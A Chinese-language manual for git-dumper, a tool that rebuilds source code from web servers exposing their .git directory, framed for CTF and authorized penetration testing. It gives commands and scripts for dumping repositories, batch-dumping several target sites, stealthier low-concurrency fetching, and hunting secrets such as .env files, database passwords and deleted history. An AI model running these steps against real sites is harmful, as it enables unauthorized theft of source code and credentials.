# git-dumper 使用手册（Git源码恢复工具）

> git-dumper 是功能强大的 .git 目录恢复工具，支持部分泄露场景和 packed objects 处理。

---

## 目录
1. [概述](#概述)
2. [安装方法](#安装方法)
3. [基本使用](#基本使用)
4. [高级功能](#高级功能)
5. [CTF应用场景](#ctf应用场景)
6. [实战案例](#实战案例)
7. [常见问题](#常见问题)
8. [参考资源](#参考资源)

---

## 概述

### 工具特点

git-dumper 由 arthaud 开发，特点包括:
- ✅ **智能恢复**: 即使部分文件缺失也能恢复
- ✅ **Pack 文件支持**: 自动处理 Git pack 文件
- ✅ **所有分支**: 恢复所有分支和标签
- ✅ **Python 3**: 现代 Python 支持
- ✅ **错误处理**: 优秀的异常处理机制
- ✅ **进度显示**: 实时显示下载进度

### 与 GitHacker 的区别

| 特性 | git-dumper | GitHacker |
|------|------------|-----------|
| Pack 文件处理 | ⭐⭐⭐⭐⭐ | ⭐⭐⭐⭐ |
| 部分泄露恢复 | ⭐⭐⭐⭐⭐ | ⭐⭐⭐ |
| 多线程 | ✅ | ✅ |
| 暴力枚举 | ❌ | ✅ |
| 安装简单 | ⭐⭐⭐⭐⭐ | ⭐⭐⭐⭐⭐ |

### 工作原理

```
1. 下载 .git/config 和 HEAD
2. 递归下载所有引用的对象
3. 解包 pack 文件（如果存在）
4. 重建索引和工作目录
5. 恢复所有分支
```

---

## 安装方法

### 方法1: pip 安装（推荐）

```bash
# 安装
pip3 install git-dumper

# 验证
git-dumper --help

# 升级
pip3 install --upgrade git-dumper
```

### 方法2: 源码安装

```bash
# 克隆仓库
git clone https://github.com/arthaud/git-dumper.git
cd git-dumper

# 安装
pip3 install -r requirements.txt
python3 setup.py install

# 或直接运行
python3 git_dumper.py --help
```

### 方法3: pipx 安装（隔离环境）

```bash
# 安装 pipx
pip3 install pipx

# 使用 pipx 安装 git-dumper
pipx install git-dumper

# 运行
git-dumper --help
```

### 依赖

```
requests>=2.25.0
beautifulsoup4>=4.9.3
dulwich>=0.20.0
```

---

## 基本使用

### 最简单的用法

```bash
# 基本命令
git-dumper http://example.com/.git/ output_dir

# 完整示例
git-dumper http://challenge.com/.git/ ./source
```

### 常用选项

```bash
git-dumper \
    http://example.com/.git/ \  # 源 URL
    output_dir \                 # 输出目录
    --jobs 10                    # 并发数（默认10）
```

### 完整参数说明

```
位置参数:
  url                   .git 目录的 URL
  output_dir            输出目录

可选参数:
  -j, --jobs N          并发任务数（默认:10）
  --proxy PROXY         使用代理
  --insecure            忽略 SSL 证书验证
  -v, --verbose         详细输出
  -q, --quiet           安静模式
  -h, --help            显示帮助
```

---

## 高级功能

### 1. 并发控制

```bash
# 默认10个并发
git-dumper http://example.com/.git/ output

# 增加并发（更快）
git-dumper http://example.com/.git/ output --jobs 20

# 减少并发（更隐蔽）
git-dumper http://example.com/.git/ output --jobs 1
```

### 2. 代理支持

```bash
# HTTP 代理
git-dumper \
    http://example.com/.git/ \
    output \
    --proxy http://127.0.0.1:8080

# SOCKS 代理
git-dumper \
    http://example.com/.git/ \
    output \
    --proxy socks5://127.0.0.1:1080
```

### 3. SSL 证书忽略

```bash
# 忽略 SSL 证书错误（自签名证书）
git-dumper \
    https://example.com/.git/ \
    output \
    --insecure
```

### 4. 详细输出

```bash
# 显示详细信息
git-dumper \
    http://example.com/.git/ \
    output \
    --verbose

# 输出包括:
# - 每个对象的下载状态
# - HTTP 响应详情
# - 错误信息
# - 恢复过程
```

### 5. 安静模式

```bash
# 只显示错误信息
git-dumper \
    http://example.com/.git/ \
    output \
    --quiet
```

---

## CTF应用场景

### 场景1: 标准 Git 泄露

```bash
# 1. 检测泄露
curl -I http://challenge.com/.git/HEAD

# 2. 下载源码
git-dumper http://challenge.com/.git/ source

# 3. 进入目录
cd source

# 4. 查看文件结构
tree -L 2

# 5. 查找 flag
grep -r "flag{" .
find . -name "flag*"
```

### 场景2: Pack 文件场景

Git 会将多个对象打包到 pack 文件中以节省空间。git-dumper 能自动处理：

```bash
# 下载（自动解包）
git-dumper http://challenge.com/.git/ repo

cd repo

# 验证 pack 文件已被处理
ls -lh .git/objects/pack/

# 查看所有对象
git verify-pack -v .git/objects/pack/*.idx | head -20

# 提取特定对象
git cat-file -p <hash>
```

### 场景3: 部分泄露恢复

即使某些文件无法访问，git-dumper 仍能尽可能恢复：

```bash
# 尝试恢复
git-dumper http://challenge.com/.git/ partial --verbose

cd partial

# 查看恢复的内容
git status

# 查看日志（即使工作目录不完整）
git log --all --oneline

# 查看可访问的文件
git ls-tree -r HEAD
```

### 场景4: 多分支恢复

git-dumper 会自动恢复所有分支：

```bash
# 下载所有分支
git-dumper http://challenge.com/.git/ project

cd project

# 列出所有分支
git branch -a

# 切换分支
git checkout develop
git checkout feature/secret

# 在所有分支中搜索
git log --all -S "password" --source
```

### 场景5: Stash 恢复

```bash
# 下载
git-dumper http://challenge.com/.git/ app

cd app

# 查看 stash
git stash list

# 查看内容
git stash show -p stash@{0}
git stash show -p stash@{1}

# 应用 stash
git stash apply stash@{0}

# 搜索所有 stash
for stash in $(git stash list | cut -d: -f1); do
    echo "=== $stash ==="
    git stash show -p $stash | grep -i "flag\|password"
done
```

---

## 实战案例

### 案例1: 基础源码下载

**场景**: 简单的 .git 目录泄露

```bash
# 1. 发现泄露
curl http://target.com/.git/config
# 输出: [core] repositoryformatversion = 0

# 2. 下载
git-dumper http://target.com/.git/ webapp

# 3. 分析
cd webapp
ls -la

# 4. 查找敏感文件
cat .env
cat config.php
cat database.yml

# 5. 获取 flag
grep -r "flag{" .
```

### 案例2: 已删除文件恢复

**场景**: Flag 在历史提交中后被删除

```bash
# 下载
git-dumper http://target.com/.git/ source

cd source

# 查看删除的文件
git log --diff-filter=D --summary

# 输出:
# commit abc123
# delete mode 100644 secret_flag.txt

# 恢复删除的文件
git checkout abc123^ -- secret_flag.txt

# 查看内容
cat secret_flag.txt
```

### 案例3: 配置文件中的密钥

**场景**: 数据库密码在配置文件中

```bash
# 下载
git-dumper http://target.com/.git/ app

cd app

# 查找配置文件
find . -name "*.env"
find . -name "config*"
find . -name "database*"

# 查看配置
cat .env
# 输出:
# DB_HOST=localhost
# DB_USER=admin
# DB_PASS=flag{secret_password_here}

# 或在历史中查找
git log --all -S "DB_PASS" --source
git show <commit>
```

### 案例4: 子模块处理

**场景**: 项目包含 Git 子模块

```bash
# 下载主仓库
git-dumper http://target.com/.git/ main

cd main

# 查看子模块配置
cat .gitmodules

# 输出:
# [submodule "lib/secret"]
#     path = lib/secret
#     url = http://target.com/lib/secret/.git

# 下载子模块
git-dumper http://target.com/lib/secret/.git/ lib/secret

# 查看子模块内容
cd lib/secret
ls -la
```

### 案例5: Reflog 挖掘

**场景**: Flag 在已被删除的提交中

```bash
# 下载
git-dumper http://target.com/.git/ repo

cd repo

# 查看 reflog（包括已删除的提交）
git reflog

# 输出:
# abc123 HEAD@{0}: commit: Remove sensitive data
# def456 HEAD@{1}: commit: Add secret feature
# ghi789 HEAD@{2}: commit: Initial commit

# 检出已删除的提交
git checkout def456

# 查找 flag
grep -r "flag{" .
```

### 案例6: 大型仓库优化

**场景**: 仓库很大，需要优化下载

```bash
# 使用更多并发
git-dumper \
    http://target.com/.git/ \
    bigproject \
    --jobs 20 \
    --verbose

cd bigproject

# 浅克隆（只保留最近历史）
git fetch --depth 1

# 清理不必要的对象
git gc --aggressive --prune=now
```

---

## 常见问题

### 问题1: 下载中断

**症状**: 网络问题导致下载中断

**解决**:
```bash
# git-dumper 支持断点续传
# 直接重新运行相同命令即可
git-dumper http://target.com/.git/ output

# 会自动跳过已下载的文件
```

### 问题2: Pack 文件错误

**症状**: 无法解析 pack 文件

**解决**:
```bash
# 1. 确保完整下载
git-dumper http://target.com/.git/ repo --verbose

# 2. 手动验证 pack 文件
cd repo/.git/objects/pack
git verify-pack -v *.pack

# 3. 如果损坏，重新下载
rm *.pack *.idx
# 重新运行 git-dumper
```

### 问题3: HTTP 认证

**症状**: 服务器需要认证

**解决**:
```bash
# 在 URL 中包含凭据
git-dumper http://username:password@target.com/.git/ output

# 或使用代理处理认证
```

### 问题4: 特殊字符路径

**症状**: 文件路径包含特殊字符

**解决**:
```bash
# git-dumper 自动处理
# 如果有问题，检查输出目录权限
chmod -R u+rwx output
```

### 问题5: 内存不足

**症状**: 大型仓库导致内存不足

**解决**:
```bash
# 1. 减少并发数
git-dumper http://target.com/.git/ output --jobs 5

# 2. 增加系统交换空间
# 3. 分批下载不同分支
```

---

## 性能对比

### git-dumper vs GitHacker

| 测试场景 | git-dumper | GitHacker | 说明 |
|---------|-----------|-----------|------|
| 小型仓库 (50文件) | 15秒 | 12秒 | GitHacker 稍快 |
| 中型仓库 (500文件) | 2分钟 | 1.5分钟 | 相近 |
| Pack文件场景 | 30秒 | 1分钟 | git-dumper 更快 |
| 部分泄露 | ✅ 能恢复 | ⚠️ 可能失败 | git-dumper 更好 |

---

## 进阶技巧

### 1. 批量下载

```python
#!/usr/bin/env python3
"""批量 Git 泄露利用脚本"""

import subprocess
import os

targets = [
    "http://site1.com/.git/",
    "http://site2.com/.git/",
    "http://site3.com/.git/",
]

for i, url in enumerate(targets):
    output_dir = f"dump_{i+1}"
    print(f"[*] 下载: {url} -> {output_dir}")

    try:
        subprocess.run([
            "git-dumper",
            url,
            output_dir,
            "--jobs", "10",
            "--quiet"
        ], check=True)

        print(f"[+] 完成: {output_dir}")

        # 自动分析
        os.chdir(output_dir)
        subprocess.run(["grep", "-r", "flag{", "."])
        os.chdir("..")

    except subprocess.CalledProcessError:
        print(f"[-] 失败: {url}")
```

### 2. 自动化分析

```bash
#!/bin/bash
# 下载并自动分析脚本

URL="$1"
OUTPUT="git_dump_$(date +%s)"

# 下载
echo "[*] 下载: $URL"
git-dumper "$URL" "$OUTPUT" --verbose

cd "$OUTPUT"

# 基本信息
echo -e "\n[*] 仓库信息:"
git log --oneline --all -10

# 查找敏感文件
echo -e "\n[*] 敏感文件:"
find . -name "*.env"
find . -name "config*"
find . -name "*secret*"

# 搜索关键字
echo -e "\n[*] 搜索 flag:"
grep -r "flag{" . 2>/dev/null | head -10

echo -e "\n[*] 搜索密码:"
grep -r "password" . 2>/dev/null | grep -v ".git" | head -10

# 使用 gitleaks
if command -v gitleaks &> /dev/null; then
    echo -e "\n[*] 运行 gitleaks:"
    gitleaks detect --source . --report-format json --report-path gitleaks.json
fi
```

### 3. Docker 化使用

```bash
# 创建 Dockerfile
cat > Dockerfile << 'EOF'
FROM python:3.9-slim

RUN pip install git-dumper

WORKDIR /work

ENTRYPOINT ["git-dumper"]
EOF

# 构建镜像
docker build -t my-git-dumper .

# 使用
docker run --rm -v $(pwd)/output:/output \
    my-git-dumper \
    http://target.com/.git/ \
    /output
```

---

## 安全注意事项

### 1. 合法性

```
⚠️ 仅在授权的渗透测试或 CTF 比赛中使用
⚠️ 未经授权访问他人系统是违法行为
⚠️ 遵守所在地法律法规
```

### 2. 隐私保护

```bash
# 下载后检查敏感信息
grep -r "api_key\|secret\|password" output/

# 不要公开分享下载的源码
# 特别是包含真实凭据的代码
```

### 3. 清理痕迹

```bash
# CTF 结束后清理
rm -rf output/
rm -rf ~/.git-dumper/cache/
```

---

## 参考资源

### 官方资源
- **GitHub**: https://github.com/arthaud/git-dumper
- **PyPI**: https://pypi.org/project/git-dumper/
- **Issues**: https://github.com/arthaud/git-dumper/issues

### 相关工具
- **GitHacker**: https://github.com/WangYihang/GitHacker
- **GitTools**: https://github.com/internetwache/GitTools
- **gitleaks**: https://github.com/zricethezav/gitleaks

### 学习资源
- **Git 内部原理**: https://git-scm.com/book/zh/v2/
- **CTF Wiki**: https://ctf-wiki.org/misc/other/git/
- **Dulwich 文档**: https://www.dulwich.io/

---

**文档版本**: v1.0
**更新日期**: 2025-01
**适用版本**: git-dumper v1.0.0+
